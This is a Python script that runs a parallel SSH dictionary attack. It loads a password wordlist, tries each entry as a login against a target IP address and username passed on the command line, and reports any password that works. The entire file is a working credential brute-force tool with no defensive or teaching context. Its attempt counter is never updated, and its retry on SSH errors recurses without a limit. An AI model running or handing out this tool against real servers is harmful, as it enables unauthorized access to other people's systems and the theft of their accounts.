from multiprocessing import Pool, cpu_count
import itertools
import paramiko
from tqdm import tqdm
import time
import argparse


def bruteforce_dict_ssh(ip_addr, username):
    min_length = 1
    max_length = 1
    password = ''
    
    with open('InsidePro.dic', 'r') as f:
        content=f.read()
        
    
    alnum = content.split()

    password_combinations = [
        ''.join(password_tuple)
        for length in range(min_length, max_length + 1)
        for password_tuple in itertools.product(alnum, repeat=length)
    ]

    total_attempts = len(password_combinations) 
    count = 0

    with Pool(processes=cpu_count()) as pool:  
        args = [(ip_addr, username, password) for password in password_combinations]
        for result in tqdm(pool.imap_unordered(worker, args), total=total_attempts, desc="Brute Force Progress"):
            success, password = result
            if success:
                print("Total Attempts:" + str(count))
                return success, password

    return False, None


def worker(args):
    ip_addr, username, password = args
    success = ssh_connect(ip_addr, username, password)
    return success, password


def ssh_connect(ip_addr, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip_addr, username=username, password=password, timeout=1)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print("Retrying...")
        time.sleep(2)
        success=ssh_connect(ip_addr,username,password)
        return success
    except Exception as e:
        return False
    finally:
        client.close()
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Dictionary attack')
    parser.add_argument('target_ip_addr', help='IP of target')
    parser.add_argument('target_user_name', help='Username of target')
    
    args = parser.parse_args()
    ip_addr = args.target_ip_addr
    user_name = args.target_user_name
    print(f"[*] Starting Dictionary attack on {ip_addr} with username {user_name}")
    success,password=bruteforce_dict_ssh(ip_addr,user_name)
    if success:
        print(f"Password found: {password}")
    else:
        print("No valid password found.")